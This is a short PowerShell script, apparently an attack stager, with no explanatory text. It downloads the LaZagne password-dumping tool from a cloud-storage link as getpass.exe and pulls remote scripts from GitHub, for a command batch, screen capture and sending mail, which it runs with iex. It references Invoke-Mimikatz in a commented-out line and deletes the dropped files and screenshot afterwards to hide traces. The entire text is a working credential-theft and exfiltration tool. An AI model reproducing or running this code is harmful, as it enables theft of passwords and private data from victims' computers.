$getpass = "http://nj02all01.baidupcs.com/file/8a3751a25e2e3c35a2efeca6a493cd90?bkt=p3-0000f97c6ce07253517d67a04f78fff95d1b&fid=1765898822-250528-132258145627081&time=1463636792&sign=FDTAXGERLBH-DCb740ccc5511e5e8fedcff06b081203-cqfkMofF%2FosdOpxXgilcXqpUsBo%3D&to=nj2hb&fm=Nan,B,T,t&sta_dx=18&sta_cs=0&sta_ft=exe&sta_ct=0&fm2=Nanjing02,B,T,t&newver=1&newfm=1&secfm=1&flow_ver=3&pkey=0000f97c6ce07253517d67a04f78fff95d1b&sl=78446670&expires=8h&rt=sh&r=404896427&mlogid=3237114707003119300&vuk=1765898822&vbdid=4021079758&fin=laZagne.exe&fn=laZagne.exe&slt=pm&uta=0&rtype=1&iv=0&isw=0&dp-logid=3237114707003119300&dp-callid=0.1.1"
$command = "https://raw.githubusercontent.com/gpengc/powershell/master/command.bat"
$mimikatz = "https://raw.githubusercontent.com/gpengc/powershell2/master/Invoke-Mimikatz.ps1"
$screenshot = "https://raw.githubusercontent.com/gpengc/powershell2/master/Take-ScreenShot.ps1"
$sendmail = "https://raw.githubusercontent.com/gpengc/powershell2/master/send-mail.ps1"
try{
iex((new-object net.webclient).downloadfile($getpass,"e:\getpass.exe"))
iex((new-object net.webclient).downloadstring($command))
#(new-object net.webclient).downloadstring($mimikatz) > e:\mimikatz.ps1
iex((new-object net.webclient).downloadstring($screenshot))
iex((new-object net.webclient).downloadstring($sendmail))
}
finally{
rm e:\getpass.*
rm e:\screen.png
}
